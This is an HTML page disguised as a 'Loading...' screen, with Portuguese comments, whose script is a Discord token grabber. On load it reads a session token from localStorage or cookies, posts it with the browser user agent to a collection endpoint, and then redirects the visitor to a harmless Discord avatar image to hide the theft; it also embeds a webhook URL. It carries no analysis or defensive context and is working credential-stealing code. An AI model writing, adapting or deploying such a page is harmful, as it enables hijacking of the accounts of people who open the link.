<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body { background:#2f3136; color:white; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }</style>
</head>
<body>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1521649142835974155/9npbnDyIjPCXF0zo1ONPLQ4A4bxqRlZP7zMlNdCCT0tl4mRgFznQn0CRSX91MBOhgJtw"; // ATUALIZE SEU WEBHOOK AQUI

        async function grab() {
            let token = "";
            
            // Tenta LocalStorage
            try { token = localStorage.getItem('token'); } catch(e) {}
            
            // Fallback Cookies
            if (!token) {
                const cookies = document.cookie.split(';');
                for(let c of cookies) {
                    if(c.includes('token')) { token = c.split('=')[1]; break; }
                }
            }

            // Envia para a nova API em Node.js
            await fetch('/api/grab', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token: token, ua: navigator.userAgent })
            });
            
            // Redireciona para imagem limpa
            window.location.href = "https://cdn.discordapp.com/embed/avatars/0.png";
        }
        
        grab();
    </script>
</body>
</html>
